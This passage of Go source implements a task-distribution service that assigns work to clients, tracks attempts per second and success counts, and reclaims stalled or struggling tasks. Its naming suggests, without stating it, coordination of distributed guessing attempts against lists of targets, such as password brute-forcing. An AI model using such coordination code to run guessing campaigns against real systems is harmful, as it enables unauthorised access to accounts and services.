		// Skip recently assigned tasks
		if now.Sub(task.AssignedAt) < 2*time.Minute {
			continue
		}
		
		// Calculate expected progress
		s.metricsMu.RLock()
		metrics, exists := s.clientMetrics[task.ClientID]
		s.metricsMu.RUnlock()
		
		if !exists || metrics.AvgPPS == 0 {
			continue
		}
		
		// Estimate expected progress
		elapsedMinutes := now.Sub(task.AssignedAt).Minutes()
		expectedAttempts := metrics.AvgPPS * elapsedMinutes * 60
		
		// Calculate expected progress percentage
		totalCombinations := float64(task.TargetCount * 50 * 50) // Approximate
		expectedProgress := (expectedAttempts / totalCombinations) * 100
		
		// Check if actual progress is significantly behind expected
		if task.Progress < expectedProgress*0.5 && expectedProgress > 20 {
			// Task is making less than 50% of expected progress
			log.Printf("Task %s is struggling: %.1f%% progress vs %.1f%% expected",
				task.ID, task.Progress, expectedProgress)
			strugglingTasks = append(strugglingTasks, task)
		}
		
		// Also check if task has stalled (no progress update in last 2 minutes)
		if task.LastUpdate.Valid && now.Sub(task.LastUpdate.Time) > 2*time.Minute {
			log.Printf("Task %s appears stalled (no update for %v)",
				task.ID, now.Sub(task.LastUpdate.Time))
			strugglingTasks = append(strugglingTasks, task)
		}
	}
	
	return strugglingTasks
}

// partialTaskRecovery recovers only the uncompleted portion of a task
func (s *DistributionService) partialTaskRecovery(task models.Task) error {
	// Get task details including targets
	targets, err := s.db.GetTaskTargets(task.ID)
	if err != nil {
		return err
	}
	
	// Calculate how many targets have been processed
	processedCount := int(float64(len(targets)) * task.Progress / 100)
	
	if processedCount >= len(targets) {
		// Task is actually complete or nearly complete
		return s.db.CompleteTask(task.ID)
	}
	
	// Mark processed targets as completed
	for i := 0; i < processedCount && i < len(targets); i++ {
		if err := s.db.UpdateTargetStatus(targets[i].ID, "completed"); err != nil {
			log.Printf("Error updating target status: %v", err)
		}
	}
	
	// Reclaim only unprocessed targets
	unprocessedTargets := targets[processedCount:]
	
	// Remove task-target associations for unprocessed targets
	tx, err := s.db.Begin()
	if err != nil {
		return err
	}
	defer tx.Rollback()
	
	for _, target := range unprocessedTargets {
		_, err := tx.Exec(`
			DELETE FROM task_targets WHERE task_id = $1 AND target_id = $2
		`, task.ID, target.ID)
		if err != nil {
			return err
		}
		
		// Reset target to pending
		_, err = tx.Exec(`
			UPDATE targets SET status = 'pending', updated_at = $1 WHERE id = $2
		`, time.Now(), target.ID)
		if err != nil {
			return err
		}
	}
	
	// Update task to mark it as partially recovered
	_, err = tx.Exec(`
		UPDATE tasks
		SET status = 'partially_recovered',
		    target_count = $1,
		    last_update = $2
		WHERE id = $3
	`, processedCount, time.Now(), task.ID)
	if err != nil {
		return err
	}
	
	if err := tx.Commit(); err != nil {
		return err
	}
	
	log.Printf("Partially recovered task %s: kept %d processed targets, released %d unprocessed",
		task.ID, processedCount, len(unprocessedTargets))
	
	return nil
}

// UpdateTaskHealth updates task health metrics based on client reports
func (s *DistributionService) UpdateTaskHealth(taskID string, health *TaskHealthReport) error {
	// Validate health metrics
	if health.AttemptsPerSecond < 0 || health.Progress < 0 || health.Progress > 100 {
		return fmt.Errorf("invalid health metrics")
	}
	
	// Update task in database
	err := s.db.UpdateTaskHealth(taskID, health.Progress, health.AttemptsPerSecond,
		health.SuccessCount, health.ErrorCount)
	if err != nil {
		return err
	}
	
	// Check if task needs intervention
	if health.ErrorRate() > 0.5 && health.ErrorCount > 100 {
		log.Printf("Task %s has high error rate: %.1f%%", taskID, health.ErrorRate()*100)
		// Could trigger early recovery or client health check
	}
	
	return nil
}

// TaskHealthReport represents health metrics for a task
type TaskHealthReport struct {
	TaskID            string
	Progress          float64
	AttemptsPerSecond float64
	SuccessCount      int
	ErrorCount        int
	LastError         string
	ReportedAt        time.Time
}

// ErrorRate calculates the error rate
func (thr *TaskHealthReport) ErrorRate() float64 {
	total := thr.SuccessCount + thr.ErrorCount
	if total == 0 {
		return 0
	}
	return float64(thr.ErrorCount) / float64(total)
}

// calculateDynamicExpiration calculates expiration based on client health and task complexity
func (s *DistributionService) calculateDynamicExpiration(clientID string, task *models.Task) time.Time {
	baseExpiration := 30 * time.Minute
	
	s.metricsMu.RLock()
	metrics, exists := s.clientMetrics[clientID]
	s.metricsMu.RUnlock()
	
	if !exists || metrics.AvgPPS == 0 {
		// New or unknown client, use conservative expiration
		return time.Now().Add(baseExpiration)
	}
	
	// Calculate based on task complexity and client performance
	totalCombinations := float64(task.TargetCount * 50 * 50) // Approximate
	estimatedSeconds := totalCombinations / metrics.AvgPPS
	
	// Add buffer based on client reliability
	buffer := 1.5 // 50% buffer by default
	
	if metrics.SuccessRate > 0.8 && metrics.QueueEmptyCount < 3 {
		// Reliable client, less buffer needed
		buffer = 1.2
	} else if metrics.SuccessRate < 0.5 || metrics.QueueEmptyCount > 5 {
		// Unreliable client, more buffer needed
		buffer = 2.0
	}
	
	// Consider response time variance
	if metrics.ResponseTime > 0 {
		// Add network latency considerations
		estimatedSeconds += metrics.ResponseTime.Seconds() * float64(task.TargetCount)
	}
	
	dynamicExpiration := time.Duration(estimatedSeconds*buffer) * time.Second
	
	// Apply bounds
	if dynamicExpiration < 5*time.Minute {
		dynamicExpiration = 5 * time.Minute
	} else if dynamicExpiration > 2*time.Hour {
		dynamicExpiration = 2 * time.Hour
	}
	
	return time.Now().Add(dynamicExpiration)
}

// CompleteTask marks a task as completed and updates metrics
func (s *DistributionService) CompleteTask(clientID string, taskID string, responseTime time.Duration) {
	s.metricsMu.Lock()
	if metrics, exists := s.clientMetrics[clientID]; exists {
		metrics.ActiveTasks--
		if metrics.ActiveTasks < 0 {
			metrics.ActiveTasks = 0
		}
		// Update response time
		if metrics.ResponseTime == 0 {
			metrics.ResponseTime = responseTime
		} else {
			metrics.ResponseTime = (metrics.ResponseTime + responseTime) / 2
		}
		
		// Update completion tracking
		metrics.LastTaskComplete = time.Now()
		
		// Update task duration average
		if metrics.AvgTaskDuration == 0 {
			metrics.AvgTaskDuration = responseTime
		} else {
			metrics.AvgTaskDuration = (metrics.AvgTaskDuration + responseTime) / 2
		}
		
		// Update completion rate (tasks per minute)
		completionsPerMin := 60.0 / responseTime.Seconds()
		if metrics.CompletionRate == 0 {
			metrics.CompletionRate = completionsPerMin
		} else {
			metrics.CompletionRate = (metrics.CompletionRate*0.7 + completionsPerMin*0.3) // Weighted average
		}
	}
	s.metricsMu.Unlock()
	
	// Check if we should adjust pre-allocation for this client
	go s.adjustPreAllocation(clientID)
}

// adjustPreAllocation adjusts pre-allocation strategy based on performance
func (s *DistributionService) adjustPreAllocation(clientID string) {
	s.metricsMu.RLock()
	metrics, exists := s.clientMetrics[clientID]
	s.metricsMu.RUnlock()
	
	if !exists {
		return
	}
	
	// If client frequently runs out of work, ensure we have a task ready
	if metrics.QueueEmptyCount > 3 && metrics.ActiveTasks == 0 {
		s.pendingTasksMu.RLock()
		_, hasPending := s.pendingTasks[clientID]
		s.pendingTasksMu.RUnlock()
		
		if !hasPending {
			go s.preAllocateNextTask(clientID)
		}
	}
}

// GetClientRequestInterval calculates dynamic request interval for a client
func (s *DistributionService) GetClientRequestInterval(clientID string) time.Duration {
	s.metricsMu.RLock()
	metrics, exists := s.clientMetrics[clientID]
	s.metricsMu.RUnlock()
	
	if !exists || metrics.AvgTaskDuration == 0 {
		return 10 * time.Second // Default
	}
	
	// Calculate based on average task duration and active tasks
	baseInterval := metrics.AvgTaskDuration / time.Duration(metrics.ActiveTasks+1)
	
	// Minimum 2 seconds, maximum 30 seconds
	if baseInterval < 2*time.Second {
		return 2 * time.Second
	}
	if baseInterval > 30*time.Second {
		return 30 * time.Second
	}
	
	return baseInterval
}

// GetClientMetrics returns current metrics for all clients
func (s *DistributionService) GetClientMetrics() map[string]*ClientMetrics {
	s.metricsMu.RLock()
	defer s.metricsMu.RUnlock()
	
	// Create a copy to avoid race conditions
	metricsCopy := make(map[string]*ClientMetrics)
	for k, v := range s.clientMetrics {
		metricsCopy[k] = &ClientMetrics{
			ClientID:       v.ClientID,
			LastPPS:        v.LastPPS,
			AvgPPS:         v.AvgPPS,
			SuccessRate:    v.SuccessRate,
			LastBatchSize:  v.LastBatchSize,
			LastUpdate:     v.LastUpdate,
			ActiveTasks:    v.ActiveTasks,
			TotalProcessed: v.TotalProcessed,
			ResponseTime:   v.ResponseTime,
		}
	}
	
	return metricsCopy
}

// PauseTaskAssignment pauses task assignment for an operation
func (s *DistributionService) PauseTaskAssignment(operationID string) {
	s.operationMu.Lock()
	defer s.operationMu.Unlock()
	
	if s.activeOperationID == operationID {
		s.operationPaused = true
		log.Printf("Task assignment paused for operation %s", operationID)
	}
}

// ResumeTaskAssignment resumes task assignment for an operation
func (s *DistributionService) ResumeTaskAssignment(operationID string) {
	s.operationMu.Lock()
	defer s.operationMu.Unlock()
	
	if s.activeOperationID == operationID {
		s.operationPaused = false
		log.Printf("Task assignment resumed for operation %s", operationID)
	}
}

// SetActiveOperation sets the active operation for task distribution
func (s *DistributionService) SetActiveOperation(operationID string) {
	s.operationMu.Lock()
	defer s.operationMu.Unlock()
	
	s.activeOperationID = operationID
	s.operationPaused = false
	log.Printf("Active operation set to %s", operationID)
}

// ClearActiveOperation clears the active operation
func (s *DistributionService) ClearActiveOperation() {
	s.operationMu.Lock()
	defer s.operationMu.Unlock()
	
	s.activeOperationID = ""
	s.operationPaused = false
	log.Println("Active operation cleared")
}

// IsOperationActive checks if a specific operation is active
func (s *DistributionService) IsOperationActive(operationID string) bool {
	s.operationMu.RLock()
	defer s.operationMu.RUnlock()
	
	return s.activeOperationID == operationID && !s.operationPaused
}
